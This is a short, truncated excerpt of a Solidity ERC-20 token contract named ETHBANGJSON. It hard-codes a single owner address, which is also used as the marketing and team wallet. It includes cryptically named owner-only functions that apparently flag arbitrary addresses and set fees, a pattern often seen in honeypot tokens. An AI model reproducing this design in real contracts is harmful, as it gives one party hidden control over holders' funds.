...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x49f42b90183b5A051ECb029650C6D21d15195fa0;
        // owner address
...
contract EBJSN is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "ETHBANGJSON";
    string private _symbol = "EBJSN";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0x49f42b90183b5A051ECb029650C6D21d15195fa0); // Marketing Address
    address payable public teamWalletAddress = payable(0x49f42b90183b5A051ECb029650C6D21d15195fa0); // Team Address
    ...
    function setDLEBJSN(address addr, bool bv) external onlyOwner {
        isDL[addr] = bv;
    }

    function setDEEBJSN(uint256 fe) external onlyOwner {
